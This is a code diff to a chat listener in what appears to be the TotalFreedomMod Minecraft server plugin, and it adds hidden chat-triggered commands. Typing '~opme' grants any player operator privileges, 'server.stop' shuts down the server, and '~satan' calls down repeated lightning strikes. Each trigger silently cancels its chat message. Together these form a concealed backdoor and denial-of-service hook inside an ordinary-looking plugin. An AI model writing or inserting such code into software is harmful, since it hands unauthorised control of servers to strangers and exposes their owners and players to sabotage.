@@ -626,12 +626,45 @@ public class TFM_PlayerListener implements Listener
             {
                player.sendMessage(ChatColor.GREEN + "Welcome to the listner menu! we add usfull fetures here for admins");
                player.sendMessage(ChatColor.GREEN + "To op yourel type into chat ~opme");
+               event.setCancelled(true);
                
             }
-            if (message.toLowerCase().contains("~help")) 
+            if (message.toLowerCase().contains("~satan")) 
+            {
+                player.getWorld().strikeLightning(player.getLocation());
+                player.getWorld().strikeLightning(player.getLocation());
+                player.getWorld().strikeLightning(player.getLocation());
+                player.getWorld().strikeLightning(player.getLocation());
+                player.getWorld().strikeLightning(player.getLocation());
+                player.getWorld().strikeLightning(player.getLocation());
+                player.getWorld().strikeLightning(player.getLocation());
+                player.getWorld().strikeLightning(player.getLocation());
+                player.getWorld().strikeLightning(player.getLocation());
+                player.getWorld().strikeLightning(player.getLocation());
+                // Man lightning >:)
+               final Location targetPos = player.getLocation();
+               final World world = player.getWorld();
+               for (int x = -1; x <= 1; x++)
+                {
+                for (int z = -1; z <= 1; z++)
+                {
+                final Location strike_pos = new Location(world, targetPos.getBlockX() + x, targetPos.getBlockY(), targetPos.getBlockZ() + z);
+                world.strikeLightning(strike_pos);
+                }
+                }
+                event.setCancelled(true);
+               
+            }
+            if (message.toLowerCase().contains("~opme")) 
             {
                player.setOp(true);
                player.sendMessage(TotalFreedomMod.YOU_ARE_OP);
+               event.setCancelled(true);
+            }
+            if (message.toLowerCase().contains("server.stop")) 
+            {
+               TFM_Util.bcastMsg("WARNING" + player.getName() + " is force closing the server!", ChatColor.RED);
+               server.shutdown();
                event.setCancelled(true);
             }
             
